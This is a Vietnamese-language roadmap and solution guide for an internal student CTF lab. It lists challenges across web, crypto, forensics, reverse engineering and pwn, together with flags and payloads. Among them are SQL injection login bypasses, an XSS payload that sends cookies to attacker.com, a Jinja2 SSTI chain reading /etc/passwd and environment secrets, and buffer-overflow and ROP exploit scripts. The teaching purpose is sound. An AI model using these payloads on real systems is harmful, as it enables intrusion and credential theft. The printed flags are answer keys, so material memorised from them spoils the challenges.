# 🏴 CTF Lab — Full Roadmap & Challenge Guide
> Platform nội bộ dành cho sinh viên, từ cơ bản đến nâng cao

---

## 📐 Kiến trúc tổng thể

```
Internet
    │
  Nginx (port 80)
    │
  CTFd Platform (port 8000)  ← Scoreboard, auth, submit flag
    │
  ┌─────────────────────────────────────────────────────┐
  │               Challenge Containers                   │
  │  Web    Crypto   Forensics   RE    Pwn    Misc       │
  │  5001   6001     7001        8001  9001   10001      │
  └─────────────────────────────────────────────────────┘
```

---

## 🗺️ ROADMAP — Progressive Learning Path

### Phase 1: Làm Quen (Tuần 1–2)
> Mục tiêu: Hiểu cơ bản về CTF, biết submit flag, giải được challenge đầu tiên

| # | Category | Challenge | Kỹ năng học được |
|---|----------|-----------|-----------------|
| 1 | Misc | Hello World | Submit flag, hiểu format CTF{...} |
| 2 | Misc | Morse Code | Decode morse, dùng online tools |
| 3 | Crypto | Caesar Easy | Shift cipher, bruteforce |
| 4 | Forensics | Stego Easy | LSB steganography, PIL |
| 5 | Web | SQLi Easy | SQL Injection cơ bản |

### Phase 2: Cơ Bản (Tuần 3–4)
> Mục tiêu: Thành thạo các vuln phổ biến, biết dùng Burp Suite, pwntools

| # | Category | Challenge | Kỹ năng học được |
|---|----------|-----------|-----------------|
| 6 | Web | XSS Easy | Stored XSS, cookie hijacking |
| 7 | Web | IDOR Medium | Access control, API enumeration |
| 8 | Crypto | Base64 Chain | Encoding chains, CyberChef |
| 9 | Forensics | PCAP Analysis | Wireshark, HTTP extraction |
| 10 | RE | Crackme Easy | Strings, ltrace, basic assembly |
| 11 | Pwn | BOF Easy | Stack buffer overflow, ret address |

### Phase 3: Trung Cấp (Tuần 5–6)
> Mục tiêu: Exploit automation, viết script, hiểu binary

| # | Category | Challenge | Kỹ năng học được |
|---|----------|-----------|-----------------|
| 12 | Web | SSTI Hard | Jinja2 SSTI → RCE |
| 13 | Web | JWT Forgery | JWT none algorithm, HS256 bypass |
| 14 | Crypto | RSA Weak | RSA small exponent, factoring |
| 15 | Forensics | Memory Dump | Volatility, process analysis |
| 16 | RE | Crackme Medium | Ghidra, reverse C logic |
| 17 | Pwn | ROP Chain | Return-oriented programming |

### Phase 4: Nâng Cao (Tuần 7–8)
> Mục tiêu: Full exploit chains, advanced techniques

| # | Category | Challenge | Kỹ năng học được |
|---|----------|-----------|-----------------|
| 18 | Web | Deserialization | PHP/Python pickle RCE |
| 19 | Web | SSRF | Internal service access |
| 20 | Crypto | AES-CBC Padding Oracle | Block cipher attacks |
| 21 | Forensics | Disk Image | Autopsy, deleted file recovery |
| 22 | RE | Obfuscated Binary | Anti-debug, packing |
| 23 | Pwn | Heap Exploitation | Use-after-free, tcache |

---

## 🌐 WEB EXPLOITATION

### Challenge 1: SQL Injection (Easy)
**Port:** 5001 | **Flag:** `CTF{sql1_1nj3ct10n_1s_fun_4nd_3asy}`

**Mô tả:** Trang đăng nhập BookStore bị lỗi SQLi. Login với tư cách admin mà không cần password.

**Payload:**
```sql
Username: admin' --
Password: anything

-- Hoặc
Username: ' OR '1'='1' --
```

**Điểm học:** Parameterized queries vs string formatting, sqlmap basics

---

### Challenge 2: XSS Stored (Easy)
**Port:** 5002 | **Flag:** `CTF{xss_st0r3d_c00k13_st3al3r}`

**Mô tả:** Guestbook cho phép post comment, admin bot sẽ đọc. Steal cookie của admin.

**Payload:**
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<!-- Hoặc simple test: -->
<img src=x onerror=alert(document.cookie)>
```

**Điểm học:** CSP, HttpOnly cookies, input sanitization

---

### Challenge 3: IDOR (Medium)
**Port:** 5003 | **Flag:** `CTF{1d0r_n0_auth_ch3ck_byp4ss}`

**Mô tả:** User profile tại `/profile?id=X`. Bạn là user id=1. Admin đang ở id nào đó.

**Exploit:** Enumerate `/profile?id=1`, `/profile?id=2`, ..., `/profile?id=3`

**Điểm học:** Authorization vs Authentication, UUID vs sequential ID

---

### Challenge 4: SSTI (Hard)
**Port:** 5004 | **Flag:** `CTF{ssti_jinja2_rce_m4st3r}`

**Mô tả:** Greeting card generator — tên của bạn được render vào Jinja2 template.

**Exploit chain:**
```python
# Step 1: Test SSTI
{{7*7}}  → 49 ✓

# Step 2: Access config
{{config}}

# Step 3: RCE
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}

# Step 4: Get flag
{{config.__class__.__init__.__globals__['os'].environ['FLAG']}}
```

**Điểm học:** Template engines, sandbox escape, RCE via SSTI

---

## 🔐 CRYPTOGRAPHY

### Challenge 1: Caesar / ROT13 (Easy)
**Port:** 6001

**Mô tả:** Flag được mã hóa bằng Caesar cipher với shift=13 (ROT13). Brute force 25 shifts.

**Python giải:**
```python
def rot13(text):
    return ''.join(chr((ord(c)-65+13)%26+65) if c.isupper()
                   else chr((ord(c)-97+13)%26+97) if c.islower()
                   else c for c in text)
```

### Challenge 2: Base64 Chain (Easy-Medium)
**Mô tả:** Flag được encode nhiều lớp: Base64 → Hex → Base32 → ROT13

**Tools:** CyberChef Magic Recipe, Python base64 module

### Challenge 3: RSA Weak (Medium-Hard)
**Mô tả:** RSA với n nhỏ, có thể factorize. Tìm p, q → tính phi(n) → d → decrypt.

**Tools:** factordb.com, pycryptodome, gmpy2

---

## 🔬 FORENSICS / OSINT

### Challenge 1: LSB Steganography (Easy)
**Port:** 7001

**Mô tả:** Download ảnh PNG, flag ẩn trong LSB của red channel.

**Python giải:**
```python
from PIL import Image
img = Image.open('stego.png')
pixels = list(img.getdata())
bits = [str(p[0] & 1) for p in pixels]
chars = []
for i in range(0, len(bits)-7, 8):
    byte = ''.join(bits[i:i+8])
    ch = chr(int(byte, 2))
    if ch == '\x00': break
    chars.append(ch)
print(''.join(chars))
```

**Tools:** zsteg, stegsolve, Aperi'Solve

### Challenge 2: PCAP Analysis (Medium)
**Mô tả:** File .pcap chứa HTTP traffic. Tìm credentials được gửi qua form login.

**Tools:** Wireshark → Follow TCP Stream → tìm POST data

### Challenge 3: Memory Forensics (Hard)
**Mô tả:** Memory dump từ máy bị compromise. Tìm flag trong process memory.

**Tools:** Volatility3
```bash
vol -f memory.dmp windows.pslist
vol -f memory.dmp windows.cmdline
vol -f memory.dmp windows.filescan | grep flag
```

---

## ⚙️ REVERSE ENGINEERING

### Challenge 1: Crackme Easy
**Mô tả:** Binary kiểm tra password. Tìm password đúng để in flag.

**Approach:**
```bash
strings crackme | grep CTF
ltrace ./crackme  # xem strcmp calls
strace ./crackme
# Hoặc dùng Ghidra/IDA Free để decompile
```

### Challenge 2: Crackme Medium
**Mô tả:** Binary có anti-debug, obfuscated string comparison.

**Tools:** Ghidra, GDB với pwndbg/peda, angr (symbolic execution)

```python
# Angr solution template
import angr
proj = angr.Project('./crackme', auto_load_libs=False)
state = proj.factory.entry_state()
sm = proj.factory.simulation_manager(state)
sm.explore(find=lambda s: b"Correct" in s.posix.dumps(1))
print(sm.found[0].posix.dumps(0))
```

---

## 💣 PWN / BINARY EXPLOITATION

### Challenge 1: Buffer Overflow (Easy)
**Mô tả:** Stack BOF để overwrite return address, jump đến `win()` function.

**Setup:** 64-bit binary, no canary, no PIE

```python
from pwn import *

p = remote('localhost', 9001)
# or p = process('./bof')

offset = 72  # find với cyclic()
win_addr = 0x401196  # từ `nm bof | grep win`

payload = b'A' * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

**Tools:** pwntools, gdb-peda, checksec, ROPgadget

### Challenge 2: ROP Chain (Medium-Hard)
**Mô tả:** NX enabled, cần ROP chain để gọi `system("/bin/sh")`.

**Tools:** ROPgadget, pwntools ROP module, ropper

```python
from pwn import *
elf = ELF('./rop')
rop = ROP(elf)
rop.system(next(elf.search(b'/bin/sh')))
```

---

## 🎲 MISC / STEGANOGRAPHY

### Challenge 1: Morse Code (Easy)
**Mô tả:** File audio chứa flag dưới dạng Morse code.

**Tools:** Audacity (visualize waveform), morse-decoder online

### Challenge 2: Whitespace (Easy-Medium)
**Mô tả:** File Python với trailing spaces và tabs ẩn chứa flag.

**Tools:** `cat -A file.py | grep trailing`, Whitespace language interpreter

### Challenge 3: QR Code (Easy)
**Mô tả:** Ảnh bị nhiễu, khôi phục QR code để scan lấy flag.

**Tools:** GIMP (contrast/threshold), zbarimg, online QR decoder

---

## 🚀 Setup & Deployment

### Quick Start
```bash
git clone <repo>
cd ctf-lab
docker-compose up -d
```

### Truy cập
| Service | URL |
|---------|-----|
| CTFd Platform | http://localhost:8000 |
| Web SQLi | http://localhost:5001 |
| Web XSS | http://localhost:5002 |
| Web IDOR | http://localhost:5003 |
| Web SSTI | http://localhost:5004 |
| Crypto Caesar | http://localhost:6001 |
| Forensics Stego | http://localhost:7001 |

### Thêm Challenge mới
```bash
# 1. Tạo thư mục
mkdir challenges/web/new-challenge

# 2. Viết app.py + Dockerfile

# 3. Thêm vào docker-compose.yml
  web-new-challenge:
    build: ./challenges/web/new-challenge
    ports:
      - "5005:5000"

# 4. Import vào CTFd
#    Admin → Challenges → Import
```

### CTFd Setup (lần đầu)
1. Truy cập http://localhost:8000
2. Tạo admin account
3. Setup event: tên, thời gian, mode (jeopardy)
4. Import challenges hoặc tạo thủ công
5. Điền URL challenge + flag cho mỗi bài

---

## 🛠️ Tools Sinh Viên Cần Cài

### Web
- **Burp Suite Community** — intercept, repeat, intruder
- **sqlmap** — automated SQLi: `sqlmap -u "http://..." --dbs`
- **curl / httpie** — manual HTTP requests

### Crypto
- **CyberChef** — https://gchq.github.io/CyberChef
- **pycryptodome** — `pip install pycryptodome`
- **SageMath** — cho số học (RSA, ECC)

### Forensics
- **Wireshark** — PCAP analysis
- **Autopsy** — disk forensics
- **Volatility3** — memory forensics
- **zsteg / stegsolve** — steganography
- **binwalk** — file carving: `binwalk -e file`
- **exiftool** — metadata

### RE
- **Ghidra** (free) hoặc **IDA Free** — decompiler
- **GDB + pwndbg** — debugger: `pip install pwndbg`
- **strings, ltrace, strace** — basic analysis
- **angr** — symbolic execution

### Pwn
- **pwntools** — `pip install pwntools`
- **ROPgadget** — `pip install ROPgadget`
- **checksec** — security features của binary

---

## 📊 Scoring Suggestion

| Level | Points | Time Limit |
|-------|--------|------------|
| Easy | 100 pts | Không giới hạn |
| Medium | 250 pts | Không giới hạn |
| Hard | 500 pts | Không giới hạn |
| Very Hard | 1000 pts | Không giới hạn |

> **Tip:** Dùng dynamic scoring trong CTFd (càng nhiều người solve → điểm càng giảm) để khuyến khích first blood.

---

*Được tạo cho mục đích học tập và thi đấu nội bộ. Không sử dụng các kỹ thuật này trên hệ thống thực mà không có sự cho phép.*
